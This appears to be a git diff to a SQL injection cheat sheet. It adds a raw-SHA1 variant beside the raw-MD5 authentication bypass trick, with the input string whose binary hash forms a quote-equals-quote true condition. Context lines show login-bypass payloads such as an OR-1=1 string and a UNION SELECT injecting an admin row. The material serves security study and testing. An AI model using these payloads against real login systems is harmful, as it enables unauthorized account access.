@@ -31,6 +31,7 @@ Attempting to manipulate SQL queries may have goals including:
   * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
   * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
 * [Authentication bypass](#authentication-bypass)
+  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
 * [Polyglot injection](#polyglot-injection-multicontext)
 * [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
@@ -365,7 +366,7 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-## Authentication Bypass (Raw MD5)
+## Authentication Bypass (Raw MD5 SHA1)
 
 When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
 
@@ -377,6 +378,7 @@ Allowing an attacker to craft a string with a `true` statement such as `' or 'SO
 
 ```php
 md5("ffifdyop", true) = 'or'6�]��!r,��b
+sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
 ```
 
 Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
